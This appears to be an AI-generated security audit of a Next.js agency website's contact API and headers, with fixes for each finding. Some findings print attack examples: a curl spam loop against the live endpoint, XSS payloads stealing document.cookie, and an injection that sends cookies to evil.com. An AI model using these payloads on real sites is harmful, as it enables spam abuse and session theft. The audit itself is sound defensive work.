# Security Audit Report -- TheMonkeys Web

**Date:** 2026-03-15
**Branch:** `feat/bold-corporate-redesign`
**Auditor:** Claude Opus 4.6 (Automated Security Audit)
**Framework:** Next.js 16.1.6, React 19.2.3, TypeScript, Tailwind CSS 4, Sanity CMS, Resend API
**Deployment target:** Vercel

---

## Executive Summary

The TheMonkeys Web project is a marketing/agency website with a single server-side API endpoint (`/api/contact`) and CMS-driven content. The attack surface is relatively narrow, but the contact form API presents several exploitable weaknesses. The application has **no security headers configuration**, **no rate limiting**, **no CSRF protection**, and carries a **known high-severity dependency vulnerability**. The overall security posture is **below production-ready standards**.

### Risk Summary

| Severity | Count |
|----------|-------|
| Critical | 1     |
| High     | 4     |
| Medium   | 5     |
| Low      | 4     |
| **Total**| **14**|

---

## CRITICAL Findings

### SEC-01: No Rate Limiting on `/api/contact` Endpoint

- **Severity:** Critical (CVSS 8.6)
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **File:** `src/app/api/contact/route.ts` -- entire `POST` handler (line 41)
- **OWASP:** A05:2021 Security Misconfiguration

**Description:** The contact form API has zero rate limiting. Any unauthenticated client can POST unlimited requests. Each successful submission triggers a Resend API call, which is a paid service billed per email sent.

**Attack Scenario:**
1. Attacker scripts a loop: `while true; do curl -X POST https://themonkeys.do/api/contact -H 'Content-Type: application/json' -d '{"name":"x","email":"a@b.c","service":"SEO","message":"spam"}'; done`
2. Hundreds of thousands of emails are sent within minutes.
3. Resend API bill escalates rapidly (financial abuse).
4. Resend rate limits or suspends the account, causing denial of service for legitimate users.
5. Recipient inbox (`hola@themonkeys.do`) is flooded.

**Remediation:**
- Implement rate limiting using Vercel's Edge Middleware or an in-memory store (e.g., `@upstash/ratelimit` with Redis, which integrates natively with Vercel).
- Recommended limits: 3-5 requests per IP per 15-minute window.
- Example approach using Upstash:
```typescript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "15 m"),
});

// Inside POST handler, before processing:
const ip = request.headers.get("x-forwarded-for") ?? "unknown";
const { success } = await ratelimit.limit(ip);
if (!success) {
  return NextResponse.json(
    { success: false, error: "Too many requests" },
    { status: 429 }
  );
}
```

---

## HIGH Findings

### SEC-02: No Security Headers Configured

- **Severity:** High (CVSS 7.1)
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **File:** `next.config.ts` (lines 6-16), `vercel.json` (lines 1-4)
- **OWASP:** A05:2021 Security Misconfiguration

**Description:** The application has no HTTP security headers configured anywhere -- not in `next.config.ts`, not in middleware, and not in `vercel.json`. The following critical headers are missing:

| Header | Purpose | Status |
|--------|---------|--------|
| `Content-Security-Policy` | Prevents XSS, data injection | MISSING |
| `Strict-Transport-Security` | Enforces HTTPS | MISSING |
| `X-Content-Type-Options` | Prevents MIME sniffing | MISSING |
| `X-Frame-Options` | Prevents clickjacking | MISSING |
| `Referrer-Policy` | Controls referrer leakage | MISSING |
| `Permissions-Policy` | Restricts browser features | MISSING |
| `X-DNS-Prefetch-Control` | Controls DNS prefetching | MISSING |

**Attack Scenario:** Without `X-Frame-Options`, the site can be embedded in an attacker's iframe for clickjacking. Without `Content-Security-Policy`, any future XSS vector will have unrestricted access to the DOM and network. Without HSTS, first-time visitors are vulnerable to SSL stripping.

**Remediation:** Add security headers in `next.config.ts`:
```typescript
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-DNS-Prefetch-Control", value: "on" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          {
            key: "Content-Security-Policy",
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://connect.facebook.net; style-src 'self' 'unsafe-inline'; img-src 'self' https://cdn.sanity.io data:; connect-src 'self' https://www.google-analytics.com; frame-ancestors 'none';",
          },
        ],
      },
    ];
  },
  images: { /* existing config */ },
};
```

### SEC-03: No Origin/CORS Validation on Contact API

- **Severity:** High (CVSS 6.5)
- **CWE:** CWE-346 (Origin Validation Error)
- **File:** `src/app/api/contact/route.ts` -- `POST` handler (line 41)
- **OWASP:** A01:2021 Broken Access Control

**Description:** The API endpoint accepts POST requests from any origin. There is no `Origin` or `Referer` header validation. There is no CSRF token mechanism. Since the endpoint uses JSON (`Content-Type: application/json`), browsers will issue a CORS preflight for cross-origin requests, but the endpoint does not explicitly reject cross-origin requests or validate the origin.

**Attack Scenario:**
1. Attacker hosts a malicious page that POSTs to `https://themonkeys.do/api/contact`.
2. Since there is no CORS preflight handler explicitly denying cross-origin, and Vercel's default CORS behavior may allow it in some configurations, the attacker can trigger form submissions from external sites.
3. Combined with the lack of rate limiting, this enables distributed spam attacks.

**Remediation:**
```typescript
// At the start of the POST handler:
const origin = request.headers.get("origin");
const allowedOrigins = ["https://themonkeys.do", "https://www.themonkeys.do"];
if (!origin || !allowedOrigins.includes(origin)) {
  return NextResponse.json(
    { success: false, error: "Forbidden" },
    { status: 403 }
  );
}
```

### SEC-04: Known High-Severity Dependency Vulnerability (undici)

- **Severity:** High (CVSS 7.5)
- **CWE:** CWE-248, CWE-444, CWE-409
- **File:** `package.json` -- transitive dependency via `@sanity/cli-core` and direct `undici`
- **OWASP:** A06:2021 Vulnerable and Outdated Components

**Description:** `npm audit` reports **1 high severity vulnerability** with multiple advisories in `undici` (HTTP client used internally by Node.js and Sanity):

| Advisory | Severity | CVSS | Description |
|----------|----------|------|-------------|
| GHSA-f269-vfmq-vjvj | High | 7.5 | WebSocket 64-bit length overflow crashes client |
| GHSA-vrm6-8vpv-qv8q | High | 7.5 | Unbounded memory consumption in WebSocket decompression |
| GHSA-2mjp-6q6p-2qxm | Moderate | 6.5 | HTTP Request/Response Smuggling |
| GHSA-v9p9-hfj2-hcw8 | Moderate | -- | Unhandled Exception in WebSocket validation |
| GHSA-4992-7rv2-5pvq | Moderate | -- | CRLF Injection via `upgrade` option |
| GHSA-phc3-fgpg-7m6h | Moderate | -- | Unbounded memory consumption in DeduplicationHandler |

**Remediation:** Run `npm audit fix` to update `undici` to a patched version. If the fix requires a major version bump in Sanity, evaluate compatibility and update accordingly.

### SEC-05: Sandbox Resend Sender Domain (Not Production-Ready)

- **Severity:** High (CVSS 6.8)
- **CWE:** CWE-1188 (Initialization with Hard-Coded Network Resource Configuration)
- **File:** `src/app/api/contact/route.ts` -- line 101
- **OWASP:** A05:2021 Security Misconfiguration

**Description:** The email `from` address is hardcoded as `"The Monkeys Web <onboarding@resend.dev>"`. This is Resend's sandbox/testing domain. In production:
- Emails will have poor deliverability and likely land in spam.
- Resend limits sandbox sends to the account owner's email only -- other recipients will be rejected.
- The sender domain cannot be verified with SPF/DKIM, making it trivial to spoof.

**Remediation:**
1. Register and verify a custom sending domain (e.g., `noreply@themonkeys.do`) in the Resend dashboard.
2. Move the sender address to an environment variable:
```typescript
const fromAddress = process.env.RESEND_FROM_ADDRESS ?? "noreply@themonkeys.do";
// ...
from: fromAddress,
```

---

## MEDIUM Findings

### SEC-06: Honeypot-Only Bot Protection (No CAPTCHA)

- **Severity:** Medium (CVSS 5.3)
- **CWE:** CWE-799 (Improper Control of Interaction Frequency), CWE-804 (Guessable CAPTCHA)
- **File:** `src/app/api/contact/route.ts` -- lines 65-67, `src/components/ui/contact-form.tsx` -- lines 177-186
- **OWASP:** A07:2021 Identification and Authentication Failures

**Description:** The only bot protection is a honeypot field (`website`) that is hidden via CSS (`className="hidden"`). If the field contains a value, the request silently succeeds (returns `{ success: true }`) without sending an email. This is easily bypassed by any bot that parses the HTML and avoids filling hidden fields. Modern spam bots and AI-driven tools can trivially defeat honeypots.

**Attack Scenario:** A bot ignores the hidden `website` field and submits valid-looking data. Without CAPTCHA or rate limiting, the honeypot alone provides negligible protection.

**Remediation:** Add a CAPTCHA layer such as Cloudflare Turnstile (free, privacy-respecting) or hCaptcha. Turnstile integrates well with Next.js and does not degrade UX:
```typescript
// Verify Turnstile token server-side:
const turnstileResponse = await fetch(
  "https://challenges.cloudflare.com/turnstile/v0/siteverify",
  {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      secret: process.env.TURNSTILE_SECRET_KEY!,
      response: data.turnstileToken,
    }),
  }
);
```

### SEC-07: `dangerouslySetInnerHTML` in JSON-LD Without `</script>` Escaping

- **Severity:** Medium (CVSS 5.4)
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **File:** `src/components/seo/json-ld.tsx` -- lines 21-22, 25-26
- **OWASP:** A03:2021 Injection

**Description:** The JSON-LD component uses `dangerouslySetInnerHTML` with `JSON.stringify()`. While `JSON.stringify` encodes most special characters, it does NOT escape the sequence `</` which can be used to break out of a `<script>` tag. If any Sanity CMS data contains `</script>`, it will prematurely close the script tag and allow arbitrary HTML injection.

The data comes from Sanity CMS (user-controlled content from the CMS dashboard), specifically fields like `seoDescription`, `address`, and `email` via `getOrganizationSchema` and `getLocalBusinessSchema`.

**Attack Scenario:**
1. A CMS editor (or attacker who compromises CMS access) sets `seoDescription` to: `Test</script><script>alert(document.cookie)</script>`
2. `JSON.stringify` will output: `"Test</script><script>alert(document.cookie)</script>"`
3. The browser sees the first `</script>` and closes the JSON-LD script block, executing the injected script.

**Remediation:** Escape the `</` sequence after `JSON.stringify`:
```typescript
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify(organizationData).replace(/</g, "\\u003c"),
  }}
/>
```

### SEC-08: Hardcoded Recipient Email Addresses

- **Severity:** Medium (CVSS 4.3)
- **CWE:** CWE-1188 (Initialization with Hard-Coded Network Resource Configuration)
- **File:** `src/app/api/contact/route.ts` -- line 102
- **OWASP:** A05:2021 Security Misconfiguration

**Description:** The recipient email `hola@themonkeys.do` is hardcoded in the route handler. This means changing the recipient requires a code change and redeployment. While not directly exploitable, it couples configuration to code and makes incident response slower (e.g., if the inbox is compromised, redirecting emails requires a deploy).

**Remediation:**
```typescript
const toAddress = process.env.CONTACT_EMAIL_TO ?? "hola@themonkeys.do";
// ...
to: toAddress,
```

### SEC-09: Analytics Script Injection via Environment Variables

- **Severity:** Medium (CVSS 5.0)
- **CWE:** CWE-79 (Cross-site Scripting)
- **File:** `src/components/analytics/google-analytics.tsx` -- line 19, `src/components/analytics/meta-pixel.tsx` -- line 18
- **OWASP:** A03:2021 Injection

**Description:** Both analytics components interpolate `NEXT_PUBLIC_*` environment variables directly into inline `<Script>` tags using template literals:

```typescript
// google-analytics.tsx line 19
gtag('config', '${gaId}');

// meta-pixel.tsx line 18
fbq('init', '${pixelId}');
```

While `NEXT_PUBLIC_*` variables are set at build time and not user-controllable at runtime, if an attacker gains access to the Vercel environment variable configuration (or the `.env.local` file), they can inject arbitrary JavaScript through a malicious GA ID like: `'); document.location='https://evil.com/steal?c='+document.cookie; //`.

**Attack Scenario:** Requires prior compromise of the deployment environment (supply chain or configuration access). The risk is elevated because `NEXT_PUBLIC_*` variables are embedded in the client bundle and visible to all users.

**Remediation:** Validate the format of analytics IDs before interpolation:
```typescript
const GA_ID_PATTERN = /^G-[A-Z0-9]+$/;
if (!gaId || !GA_ID_PATTERN.test(gaId)) return null;
```

### SEC-10: Email Validation Regex Too Permissive

- **Severity:** Medium (CVSS 3.7)
- **CWE:** CWE-20 (Improper Input Validation)
- **File:** `src/app/api/contact/route.ts` -- lines 26-28
- **OWASP:** A03:2021 Injection

**Description:** The email validation regex `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` is extremely permissive. It accepts inputs like `"><img/src=x onerror=alert(1)>@test.com` or emails with control characters, which could cause issues in downstream email processing.

While the `escapeHtml` function prevents XSS in the HTML email body, the `text` body (line 107) uses the raw email value without escaping. Some email clients that render plain text creatively could potentially be affected.

**Remediation:** Use a stricter email regex or a proper email validation library. At minimum:
```typescript
function isValidEmail(value: string) {
  if (value.length > 254) return false;
  return /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(value);
}
```

---

## LOW Findings

### SEC-11: Sanity Client Uses CDN Without Authentication Token for Reads

- **Severity:** Low (CVSS 2.0)
- **CWE:** CWE-284 (Improper Access Control)
- **File:** `src/sanity/lib/client.ts` -- lines 8-15
- **OWASP:** A01:2021 Broken Access Control

**Description:** The Sanity client is configured with `useCdn: true` and no authentication token for read operations. This means all Sanity data is publicly readable via the CDN API. While this is standard for public CMS content, the `SANITY_API_TOKEN` defined in `.env.local.example` is unused in the client, suggesting write operations may not be properly secured or the token is unused. The `NEXT_PUBLIC_SANITY_PROJECT_ID` is exposed to the client bundle.

**Remediation:** Ensure the Sanity project's API settings have appropriate CORS origins configured. Verify that the dataset is intentionally public. If any private data exists in Sanity, use a server-only client with the API token for those queries.

### SEC-12: Error Response Does Not Leak Implementation Details (Positive) but Console Logs Full Error Objects

- **Severity:** Low (CVSS 2.4)
- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **File:** `src/app/api/contact/route.ts` -- line 124
- **OWASP:** A09:2021 Security Logging and Monitoring Failures

**Description:** The line `console.error("Failed to send contact email", error)` logs the full error object from the Resend API. In Vercel's serverless environment, these logs are stored in the Vercel dashboard. The error object may contain API keys, request details, or internal Resend infrastructure information in stack traces. While the error is not returned to the client (which is good), excessive server-side logging can lead to credential leakage in log aggregation systems.

**Remediation:**
```typescript
console.error("Failed to send contact email", error instanceof Error ? error.message : "Unknown error");
```

### SEC-13: Missing `lockfileVersion` Enforcement / No `.npmrc` Security Configuration

- **Severity:** Low (CVSS 2.0)
- **CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)
- **File:** Root directory -- missing `.npmrc`
- **OWASP:** A06:2021 Vulnerable and Outdated Components

**Description:** There is no `.npmrc` file enforcing `engine-strict=true`, `save-exact=true`, or `audit=true`. Package versions in `package.json` use `^` ranges, allowing minor/patch version drift between environments. There is no `npm ci` enforcement in the build process.

**Remediation:** Create `.npmrc`:
```
engine-strict=true
save-exact=true
audit=true
```

### SEC-14: Middleware Does Not Cover API Routes

- **Severity:** Low (CVSS 2.7)
- **CWE:** CWE-862 (Missing Authorization)
- **File:** `src/proxy.ts` (middleware file) -- lines 6-8
- **OWASP:** A01:2021 Broken Access Control

**Description:** The middleware matcher explicitly excludes API routes: `"/((?!api|_next|_vercel|studio|.*\\..*).*)"]`. This means the internationalization middleware does not process API requests (which is correct), but it also means there is no middleware layer where security controls (rate limiting, origin validation, logging) can be applied to API routes.

**Remediation:** If rate limiting or origin validation is implemented at the middleware layer, create a separate middleware matcher for API routes or use a composable middleware pattern:
```typescript
export const config = {
  matcher: [
    "/((?!_next|_vercel|studio|.*\\..*).*)",  // Include API routes
  ],
};
```

---

## Positive Security Observations

The following security practices are already implemented correctly:

1. **Input sanitization on contact API**: The `sanitizeText` and `escapeHtml` functions in `route.ts` properly sanitize and escape user input before including it in HTML email bodies. The `escapeHtml` function covers all five critical characters (`&`, `<`, `>`, `"`, `'`).

2. **Field length limits**: The API enforces maximum lengths on all fields (120 chars for name/company/service, 4000 for message), preventing buffer-related attacks and abuse.

3. **Honeypot field**: While insufficient alone, the hidden `website` field provides a baseline bot filter.

4. **Environment variable separation**: Secrets (`RESEND_API_KEY`, `SANITY_API_TOKEN`) use server-only env vars (no `NEXT_PUBLIC_` prefix), so they are not exposed in the client bundle.

5. **`.gitignore` covers `.env*`**: All environment files are properly gitignored, with only `.env.local.example` (containing placeholder values) committed.

6. **Sanity queries use GROQ (not SQL)**: No SQL injection risk. GROQ queries are hardcoded strings without user input interpolation.

7. **JSON parsing error handling**: The API properly catches `JSON.parse` errors and returns a 400 response without leaking error details.

8. **Image domain whitelist**: `next.config.ts` restricts remote images to `cdn.sanity.io` only.

9. **No exposed API keys in source**: All API keys are accessed via `process.env` and none are hardcoded in the committed source.

---

## Priority Remediation Roadmap

### Phase 1 -- Immediate (Before Production Launch)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| SEC-01 | Add rate limiting to `/api/contact` | 2-4 hours | Eliminates financial abuse and spam |
| SEC-05 | Configure verified Resend sender domain | 1 hour | Required for production email delivery |
| SEC-02 | Add security headers in `next.config.ts` | 1-2 hours | Broad defense-in-depth improvement |
| SEC-04 | Run `npm audit fix` for undici | 30 minutes | Patches known high-severity CVEs |

### Phase 2 -- Short Term (First Sprint Post-Launch)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| SEC-03 | Add origin validation to contact API | 1 hour | Prevents cross-origin abuse |
| SEC-06 | Add Cloudflare Turnstile CAPTCHA | 3-4 hours | Strong bot protection layer |
| SEC-07 | Escape `</` in JSON-LD output | 15 minutes | Closes CMS-driven XSS vector |
| SEC-08 | Move recipient email to env var | 15 minutes | Configuration decoupling |

### Phase 3 -- Hardening (Ongoing)

| # | Finding | Effort | Impact |
|---|---------|--------|--------|
| SEC-09 | Validate analytics ID format | 30 minutes | Defense-in-depth for supply chain |
| SEC-10 | Tighten email validation regex | 30 minutes | Reduces edge-case injection surface |
| SEC-11 | Review Sanity CORS/access settings | 1 hour | CMS access control verification |
| SEC-12 | Sanitize console.error output | 15 minutes | Reduce log leakage risk |
| SEC-13 | Add `.npmrc` security config | 15 minutes | Dependency management hygiene |
| SEC-14 | Extend middleware for API security | 2 hours | Centralized security controls |

---

## Compliance Notes

- **GDPR**: The contact form collects personal data (name, email, company). A privacy policy link should be visible near the form. No consent checkbox is present. Consider adding one if targeting EU users.
- **Email marketing**: The form does not subscribe users to a mailing list, so CAN-SPAM/GDPR opt-in is not currently required, but ensure this remains the case.
- **Analytics**: Google Analytics and Meta Pixel are loaded. For GDPR compliance, a cookie consent banner should be implemented before these scripts execute.

---

*End of security audit report. Generated 2026-03-15.*
